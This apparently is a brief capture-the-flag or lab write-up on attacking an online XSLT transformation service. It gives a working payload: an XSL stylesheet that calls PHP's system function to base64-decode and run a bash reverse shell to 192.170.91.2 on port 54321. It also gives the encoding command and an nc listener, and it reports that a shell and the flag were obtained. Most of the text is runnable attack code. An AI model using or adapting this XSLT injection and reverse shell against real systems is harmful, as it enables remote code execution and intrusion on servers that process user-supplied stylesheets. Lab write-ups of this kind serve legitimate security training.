# XSL

XSL (eXtensible Stylesheet Language) is a styling language for XML. XSLT stands for XSL Transformations.

An Online Transformation Service application is provided. It expects an XML and an XSL file to be uploaded by the user. After both the files are uploaded, the XML file is transformed according to the instructions in the XSL file.

# Save the following content as test.xml

```
<?xml version="1.0"?>
<root>Hello, World!</root>
```

# Base64 encoding to bash reverse shell

echo "/bin/bash -c 'bash -i>& /dev/tcp/192.170.91.2/54321 0>&1'" | base64 -w0 ; echo

# Save the following content as test.xsl

```
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"
version="1.0">
<!-- We add the PHP's xmlns -->
    <xsl:template match="/">
        <html>
            <!-- We use the php suffix to call the functions -->
            <xsl:value-of select="php:function('system','echo L2Jpbi9iYXNoIC1jICdiYXNoIC1pPiYgL2Rldi90Y3AvMTkyLjE3MC45MS4yLzU0MzIxIDA+JjEnCg==|base64 -d|bash')" />
            <!-- Output: 'Php Can Now Be Used In Xsl' -->
        </html>
    </xsl:template>
</xsl:stylesheet>
```
![image](https://github.com/user-attachments/assets/ea699521-3d7e-4cbf-835f-96392437667c)

# listen the port

nc -lvnp 54321

# Finally got reverse shell, and it's flag

![image](https://github.com/user-attachments/assets/ce8e16db-cc48-47e2-b20b-d2d99a8666bc)


# Upload those files and transform

